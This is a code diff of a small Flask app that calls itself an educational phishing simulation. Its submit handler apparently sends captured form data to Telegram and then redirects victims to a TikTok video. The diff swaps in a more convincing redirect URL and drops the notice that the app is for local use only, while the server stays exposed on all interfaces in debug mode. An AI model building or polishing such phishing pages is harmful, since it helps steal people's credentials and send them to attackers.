@@ -97,9 +97,8 @@ def submit():
 📁 <i>Log disimpan ke:</i> {LOGFILE}"""
 
     kirim_telegram(notif)
-    return redirect("https://www.tiktok.com")
+    return redirect("https://www.tiktok.com/@malangskyland/video/7562093910084881682?q=malang%20viral%20terbaru&t=1763209498646")
 
 if __name__ == "__main__":
     print("=== SIMULASI PHISHING EDUKATIF ===")
-    print("Buka http://127.0.0.1:5000 di browser (hanya lokal).")
-    app.run(host="0.0.0.0", port=5000, debug=True)
+    app.run(host="0.0.0.0", port=3000, debug=True)
